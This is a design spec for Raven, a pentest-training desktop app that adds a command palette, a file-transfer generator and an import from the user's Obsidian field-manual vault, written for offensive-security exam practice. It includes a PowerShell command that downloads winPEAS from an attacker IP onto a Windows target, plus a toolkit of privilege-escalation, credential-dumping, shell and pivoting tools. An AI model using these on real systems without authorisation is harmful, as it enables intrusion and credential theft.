# Raven: Arsenal, ⌘K and the Field Manual import (phase 2, project 2a)

> **Frozen record, shipped** (written 2026-11-05, last revised 2026-11-07). This spec records the decisions and reasoning at the time. For how Raven works now, read `PRODUCT.md`, `DESIGN.md` and the code; where this spec and the app differ, the app wins.

**Date:** 2026-11-05
**Builds on:** `2026-11-03-raven-desktop-design.md` §10 phase 2, and `2026-11-05-raven-pen200-restructure-design.md` (project 1, merged).
**Source of commands:** the user's Field Manual Obsidian vault (its folder is set in Settings). Its contract with Raven is `00-Home/Conventions.md`.

## 1. Intent

Mid-box, the user needs commands that aren't on the current checklist step, and has to dig for them. The example that prompted this design was getting winPEAS onto a Windows host:

```
powershell -c "iwr -uri http://10.10.14.7/winPEASx64_ofs.exe -OutFile C:\Windows\Temp\winPEASx64.exe"
```

The user went looking for it "under file transfer commands in the attack methodology". This project makes that a few keystrokes, already filled for the host they're on.

There's a second job: the vault becomes a live source. The user edits cards in Obsidian, Raven imports them, and Raven reports where the two have drifted apart. That replaces the one-time hand copy from project 1.

**The user's priorities** (ADHD and autism): speed and as little friction or distraction as possible. One way of doing a thing beats three.

## 2. Goals, non-goals, anti-goals

**Goals (2a)**
1. **⌘K from anywhere.** Search commands, generators and cards, plus the current engagement's log, notes and credentials, with secrets masked. Enter copies the command filled for the current host; ⌘Enter copies it and logs it.
2. **Arsenal drawer.** It opens from a title-bar "Arsenal" button or the `A` key. It slides over the current screen, the way Notes (`N`) and Stuck (`H`) do, and Esc returns. It fills for the host in view, and has a full-screen browse layout organised by stage and category.
3. **Card links on checklist steps.** Each step's commands say which card they came from ("From card X ↗"), and clicking that opens the drawer on the card.
4. **"Transfer a file" generator.** You pick a file, a target host and folder, and a method. It gives you the Kali serve command and the target fetch command as a pair. Logging the fetch adds the file to the cleanup list, using step 6's existing cleanup suggestions.
5. **Toolkit.** A vault note lists the user's transfer tools. It drives the generator's file picker and `{FILE}`.
6. **Field Manual import with a drift report.** It lives in Settings.
7. **Placeholder auto-fill alignment.** See §7.
8. **One-off vault edits**, made by the builder with a backup and the user's review: the `{PORT}` renames and the new Toolkit note with a staging script. See §8.

**Non-goals (2a)**
- Other generators: reverse shell, msfvenom, the PowerShell encoder and TTY upgrade. These are 2b.
- Output interpreters, such as pasted `sudo -l` or linPEAS output. These are 2b.
- The vault's prose (playbooks, foundations, "is this normal?" tables). This is phase 4. **The user requires a full Field Manual notes library in phase 4, so don't drop it.**
- Raven writing to the vault. Raven only ever reads it.
- Client-engagement work, such as passive recon and the dossier. That's project 3, after the exam.

**Anti-goals**
- A second place to learn. There's no separate "Field Manual" screen and no new engagement-sidebar section, because the Arsenal isn't tied to one engagement.
- Losing a command. An import must never drop a built-in command or a goal link that the checklist relies on.
- Banned or Metasploit commands leaking into exam sims. The rules in `examRules.ts` apply to everything the Arsenal and ⌘K show.

## 3. Where it lives in the UI

- **Title bar:** a "Search ⌘K" button and an "Arsenal A" button, both next to Settings.
- **⌘K palette:**
  - It's centred and keyboard-first.
  - It shows a "for <host>" chip: the host in view, or none on the dashboard.
  - **Keys:**

    | Key | Action |
    |---|---|
    | ↵ | copy |
    | ⌘↵ | copy and log, through the existing capture path |
    | → | open the card in the drawer |
    | ⇥ | edit a fill value, such as `{FILE}` |

  - Results are grouped as commands, generators, cards, then engagement items.
- **Arsenal drawer:**
  - It has its own search box.
  - When opened from a step's card link, it shows that card.
  - It shows the card's blocks in vault order, filled, followed by "Also in Raven": Raven-source commands linked to the same goals.
  - Fill chips at the top (LHOST, FILE, TARGET_IP and so on) are editable, and an edit applies to the whole drawer.
  - A "⤢ full screen" link opens the browse layout.
- **Full-screen browse:** stage and category filters plus a Generators list on the left, and the card on the right. The shape follows the mockup the user saw.
- **Checklist steps:** under each command list, "From card <Card-Name> ↗ · more in Arsenal", with one card link per distinct card.
- **Dashboard:** with no host in view, commands show unfilled tokens, with LHOST still filled from settings.

## 4. Toolkit and the "Transfer a file" generator

**Toolkit note.** It's a new vault note, `00-Home/Toolkit.md`. It holds two tables, `## Windows targets` and `## Linux targets`, each with the columns `Purpose | File to transfer | Where to get it`.
- **✅ means staged:** a ✅ after a file means the user already has it staged in `~/tools/` on Kali.
- **Content:** the user's list, which the builder writes into the note verbatim. It's reproduced in Appendix A.
- **Parsing:**
  - Each backticked full file name in the "File to transfer" cell is one file. It inherits that row's purpose and source, and a ✅ applies to every file in its cell.
  - A blank Purpose cell inherits the row above.
  - When the builder writes the note (§8), every file is spelled out in full, so the parser never has to guess: `GodPotato-NET4.exe` / `GodPotato-NET35.exe` / `GodPotato-NET2.exe`, `pspy64` / `pspy32`, `nc.exe` / `nc64.exe`. Everything else is the user's list unchanged (Appendix A).

**Kali folders.** Two settings: Windows tools folder, default `~/tools/windows`; Linux tools folder, default `~/tools/linux`.

**Generator**
1. **File:** a picker grouped by purpose, filtered to the target's OS.
   - Staged ✅ files are listed first.
   - Choosing an unstaged file shows "not staged on Kali; get it from: <where>", with the row's note.
   - Free text is allowed.
2. **To:** the target host, defaulting to the host in view, and a folder. Folder defaults: Windows `C:\Windows\Temp`, Linux `/tmp`. The last used folder per OS is remembered.
3. **Method:** the transfer methods come from the vault cards File-Transfer-to-Windows and File-Transfer-to-Linux. The generator reads them from those imported cards, so editing a card changes the generator. The cards' existing structure is the contract, and Conventions.md gains it in writing (§8):
   - Each `**Sub-method: X**` line starts a method group: HTTP, SMB share on Kali, RDP, WinRM and penelope, FTP, and so on.
   - Within a group, `Kali` blocks are the "On Kali" half and `Target — …` blocks are the "On <host>" half.
   - The HTTP group, which holds several alternative fetch blocks, shows one tab per Target block: iwr, `powershell -c` iwr, WebClient, certutil, bitsadmin, curl.exe on Windows; wget, curl and the rest on Linux. The group's Kali block is the serve command for every tab.
   - Every other group shows one tab for the group, with all its blocks in card order. For example, SMB is the Kali share, then `net use`, then `copy`.
   - A group with only Kali blocks, such as evil-winrm or penelope upload, shows only "On Kali".
4. **Output:**
   - "1 · On Kali": the group's Kali blocks, exactly as the card has them (for HTTP, `cd ~/tools/windows && python3 -m http.server 80`). The card wins; Raven adds nothing.
   - "2 · On <host>": the chosen Target block or blocks.
   - Both are filled with `{LHOST}`, `{FILE}` and `{DEST_DIR}`, and copy-ready. `{DEST_DIR}` is a new token, introduced by the vault edit in §8, that fills from the "To" folder.
   - ⌘↵ on the fetch command logs it against the host. Step 6's cleanup suggester already reads `iwr`, `powershell -c`, certutil, curl, wget and DownloadFile fetches from logged commands, so the file is suggested for cleanup without the generator writing anything itself. A test pins this for every generator method that writes a file onto the target.

**`{FILE}` everywhere.** Any command with `{FILE}`, `{SCRIPT}` or similar shows a picker chip with the same list. A ⌘K query that names a tool (for example "winpeas") pre-fills `{FILE}` with the best staged match. For winPEAS that's `winPEASx64_ofs.exe`, with `winPEASany_ofs.exe` offered right below it.

## 5. Field Manual import

- **Vault path:** set in Settings, with the path above as the default. Rust reads the folder; nothing is written.
- **Trigger:** an "Import now" button in Settings › Field Manual. There's no background sync.
- **Change dot:** when the modification time of any file Raven reads (cards, playbooks, Toolkit) is newer than the last import, the Settings link shows a dot. Checking this is cheap, and happens at app focus.
- **What's read:**
  - every `02-Cards/**/*.md` card with `type: card`;
  - `01-Playbook/*.md` (checklist items only, for drift);
  - `00-Home/Toolkit.md`.

  Parsing follows `Conventions.md`: frontmatter `id`, `stage`, `os`, `category`; a `###` title, `**Why:**` line and fenced block for each command; fence title `Kali` means attacker, `Target — …` means target.
- **Storage:** imported cards and commands go into the encrypted database through a new migration, with a backup first.
  - **Built-ins stay.** `fieldManual.ts` is the fallback until the first import, and in a fresh install.
  - **After an import,** a card's imported commands replace the built-in `fm-<cardId>-*` entries for that card.
  - **Matching** is on `cardId` plus the block's `###` title, falling back to `cardId` plus normalised template (whitespace collapsed) when the title changed. It is **never on the `-<n>` number**, which drifted from vault block order in project 1.
    - Same card and title with a different template counts as *changed*: the id is kept, and the new template is used.
    - A block matching on neither counts as *added*.
    - A matched command keeps its built-in id, auto-tick matcher, `exam` rule and goal links. New vault blocks get new ids and the card's goal links.
  - **User overlays:** the library types declare `edited`, `retired` and `preferred` overlays, but no code stores or applies them yet, so there's nothing for an import to clash with. When overlays are built later, they must win over imports.
- **No losses:**
  - A vault block that disappears from a card keeps its built-in entry, flagged in the drift report as "removed in the vault, kept in Raven". It's never silently dropped while a checklist step still links to it.
  - Raven-source commands are never touched by an import.
- **Report after each import:**
  - cards added, changed or removed, and commands added, changed or removed;
  - **Drift:**
    - playbook items with no Raven step;
    - Raven steps whose playbook item has gone or been reworded.

      **How steps map to playbook items:** this project adds a `playbook` field to every host and engagement goal. It holds the vault file (for example `04 - Privilege Escalation.md`) and the item's exact text, with the `→ [[…]]` tail stripped, as of project 1's mapping. An item counts as "no Raven step" when its stripped text matches no goal's `playbook` text. A goal counts as "reworded" when its `playbook` text no longer appears in its file. Matching is exact after the stripping and whitespace collapse, with no fuzzy threshold. Raven-only steps carry no `playbook` field and are listed as such.
    - placeholders Raven can't fill, with counts, labelled "fine: you type these" for the manual list in §7;
    - Raven-only commands that are in no card;
    - Toolkit files no card command mentions (informational).
- **Exam safety:** every imported command goes through the same exam classification as project 1. A command invoking `msfconsole`, `meterpreter`, `use exploit|auxiliary|post/` or `msfvenom … meterpreter` gets `exam: 'metasploit'`. A card marked `exam: prohibited`, or a block whose note says it's banned, gets `banned`. The report lists every command it classified.

## 6. ⌘K search scope and ranking

- **What's searched:**
  - commands (title, tool, template, card name);
  - generators;
  - cards;
  - in the current engagement: log entry titles and commands, notes and credential labels. Secrets are never shown or matched in plain text.
- **Matching:** fuzzy and word-prefix. "winpeas transfer" finds the transfer commands with `{FILE}` set to winPEAS.
- **Ranking:** commands for the host's OS and current stage come first, then the rest.
- **Filtering:** exam sims hide banned commands and lock Metasploit commands, exactly as the checklist does.

## 7. Placeholder auto-fill

Raven fills these new tokens:

| Token | Filled with |
|---|---|
| `{TARGET_HOST}` | the host's FQDN: `name.domain` when the engagement has a domain and the host is domain-joined, otherwise the name |
| `{HOSTNAME}` | the host name |
| `{PIVOT_IP}`, `{PIVOT_NAME}` | the IP and name of the tunnel's via-host for the host in view |
| `{KALI_USER}` | a new setting, default `kali` |
| `{COMMUNITY}` | default `public`, editable per chip |
| `{SOCKS_PORT}` | default `1080` |
| `{DEST_DIR}` | the generator's "To" folder; elsewhere, `C:\Windows\Temp` on Windows and `/tmp` on Linux |
| `{PORT}` | the port of the service the command is about (below) |

- **`{PORT}`:** under a checklist step, it's the host's open ports that match the step's existing `applies.ports` / `applies.services`. With several matches, the chip offers each one, defaulting to the lowest. Outside a step (⌘K, the drawer), the chip offers every open port on the host. In the vault, `{PORT}` meaning a pivot's internal port is renamed to `{TARGET_PORT}`, which stays manual (§8). **The rename must land before the first import**, or pivot commands get a service port.
- **Stay manual:** `{FILE}` and `{SCRIPT}` (picker), `{OUTPUT}`, `{SHARE}`, `{SPN}`, `{PARAM}`, `{NEW_USER}`, `{NEW_PASS}`, `{KALI_PASS}`, `{LOCAL_PORT}`, `{LISTEN_PORT}`, `{BIND_PORT}`, `{TARGET_PORT}`, `{EDB_ID}`, `{DOMAIN_SID}`.
- **Unfilled tokens** keep today's behaviour: shown as tokens, editable through chips.

## 8. One-off vault edits (done by the builder, not by Raven)

1. **Back up first:** copy the whole vault to a dated folder next to it before any edit.
2. **`{PORT}` renames:** script it. Every `{PORT}` that means a pivot or forward's internal port becomes `{TARGET_PORT}`: in socat, plink `-R`, ssh `-L`/`-R`, netsh portproxy, chisel and ligolo listener contexts. A `{PORT}` meaning the target service's port is left alone. Show the user the full diff and apply it only after they approve.
3. **Toolkit note:** write `00-Home/Toolkit.md` with the two tables (Appendix A) and a **staging script** in a ```` ```bash ```` code block, for the user to run on the Kali VM before an exam or engagement. The script must:
   - create `~/tools/windows` and `~/tools/linux`;
   - copy the files Kali already packages from the `/usr/share/...` paths in the table;
   - download the GitHub-release files through the GitHub releases API (`/repos/<owner>/<repo>/releases/latest`), picking the asset by name pattern and unzipping or extracting it when needed: PEASS-ng `_ofs` builds, Seatbelt, PrintSpoofer, GodPotato (all three .NET builds), SigmaPotato, JuicyPotatoNG, Rubeus 2.x, RunasCs, ligolo-ng agents, chisel, pspy and les.sh. AccessChk comes from Sysinternals and static socat from andrew-d.
   - **check each file's architecture** with `file`: x86-64 or i386 PE for Windows, as the name says, and ELF x86-64 or i386 for Linux. Flag any mismatch.
   - be safe to re-run: skip files already present and verified, unless `--force`;
   - finish with a ✅/❌ table per file, which the user can use to update the ✅ marks in the note;
   - work on ARM64 Kali (the user's VM): it downloads x86 target binaries, never installs packages for the VM's own architecture, and uses only tools Kali has by default (`curl`, `jq`, `unzip`, `tar`, `file`);
   - use no hard-coded version numbers.
4. **Linux transfer card:** merge its "Host on Kali" and "Pull from the target" groups into one `**Sub-method: HTTP (default)**` group, with the serve block(s) first. Every block's text stays the same. This lets the §4 pairing rule apply.
5. **`{DEST_DIR}`:** in File-Transfer-to-Windows and File-Transfer-to-Linux, the destination folder in each target-side write (`C:\Windows\Temp\` and `/tmp/`) becomes `{DEST_DIR}`. Include it in the same diff review.
6. **Conventions.md** gains short sections on the Toolkit format, the transfer-card generator contract (§4, method 3) and the `{DEST_DIR}` token, so Raven and the vault keep agreeing.

**Order:** these edits happen before Raven's first import.

## 9. Left to the builder
- ⌘K fuzzy-matching library or algorithm, ranking weights, and result limits.
- The exact schema for imported cards and commands, within §5's rules.
- Drawer width, and the layout details of full-screen browse.
- Which Linux transfer methods from the card appear as generator tabs.
- How Rust watches modification times for the change dot.

## 10. Calls I made (the user should check these)
1. **The Toolkit lives in the vault**, at `00-Home/Toolkit.md`, and Raven reads it on import; it isn't a Raven setting.
2. **Raven only reads the vault.** The `{PORT}` renames and the Toolkit note are a one-off builder edit, with a backup and the user's diff review.
3. **Imports are manual**, a button in Settings, with a change dot. There's no background sync.
4. **Imported cards replace their built-in copies** but keep matched ids, matchers, exam rules and goal links. Commands removed in the vault are kept and flagged, never dropped.
5. **⌘↵ copies and logs.** ↵ only copies.
6. **The `A` key opens the drawer.** No existing shortcut uses it.
7. **The staging script prints a ✅/❌ table** for the user to update the note by hand, because Raven can't see the Kali VM's files.
8. **The generator's Kali half is whatever the card says,** with no added `sudo`. If port 80 needs root on your Kali, edit the card and the generator follows.
9. **The generator's tabs come from the cards' existing `**Sub-method:**` structure.** A new `{DEST_DIR}` token makes the destination folder fill in.
10. **Each step stores the exact text of its playbook item,** so drift is an exact match, not fuzzy.
11. **In the Toolkit note, file names are written out in full,** for example `GodPotato-NET35.exe` and `pspy32`, instead of the shorthand in your list.

## Appendix A: Toolkit tables (the user's list, verbatim)

### Windows targets

| Purpose | File to transfer | Where to get it |
|---|---|---|
| **Privesc enumeration** | `winPEASx64_ofs.exe` (obfuscated) + `winPEASany_ofs.exe` (fallback for 32-bit / unknown arch) | PEASS-ng GitHub releases. The Kali package (`/usr/share/peass/winpeas/`) may not include the `_ofs` builds. |
| | `PowerUp.ps1` | `/usr/share/windows-resources/powersploit/Privesc/` |
| | `Seatbelt.exe` | GitHub (GhostPack). Not packaged on Kali. |
| | `accesschk64.exe` | Sysinternals `AccessChk.zip` |
| **SeImpersonate → SYSTEM** | `PrintSpoofer64.exe` / `PrintSpoofer32.exe` ✅ | itm4n GitHub releases |
| | `GodPotato-NET4.exe` / `-NET35` / `-NET2` ✅ | BeichenDream GitHub releases |
| | `SigmaPotato.exe` | tylerdotrar GitHub releases |
| | `JuicyPotatoNG.exe` | antonioCoco GitHub releases |
| **Credentials** | `mimikatz.exe` (x64) | `/usr/share/windows-resources/mimikatz/x64/` |
| | `Rubeus.exe` | `/usr/share/windows-resources/rubeus/` (old 1.6.4), or a newer 2.x build from GitHub |
| **AD enumeration** | `SharpHound.exe` ✅ (v2.x, for BloodHound CE) | `/usr/share/sharphound/` |
| | `PowerView.ps1` | `/usr/share/windows-resources/powersploit/Recon/` |
| **Run as another user** | `RunasCs.exe` | antonioCoco GitHub releases |
| **Shells** | `nc.exe` ✅ (64-bit `nc64.exe` too) | `/usr/share/windows-resources/binaries/` |
| | `powercat.ps1` | `/usr/share/windows-resources/powercat/` |
| **Pivoting** | `agent.exe` (ligolo-ng, windows_amd64) | `ligolo-ng-common-binaries` package or GitHub releases |
| | `chisel.exe` (windows_amd64) | GitHub releases. Use the static release build, not Kali's package. |

### Linux targets

| Purpose | File to transfer | Where to get it |
|---|---|---|
| **Privesc enumeration** | `linpeas.sh` | `/usr/share/peass/linpeas/` |
| | `pspy64` (+ `pspy32`) | GitHub releases. Kali's `pspy` package won't install on ARM64 Kali. |
| | `les.sh` (linux-exploit-suggester) | mzet- GitHub (raw script) |
| **Pivoting** | ligolo-ng `agent` (linux_amd64) | `ligolo-ng-common-binaries` or GitHub releases |
| | `chisel` (linux_amd64, static) | GitHub releases |
| | `socat` (static x86_64) | `andrew-d/static-binaries` |
| **Shells** | static `nc` / `ncat` | static-binaries repos, if the target has none |
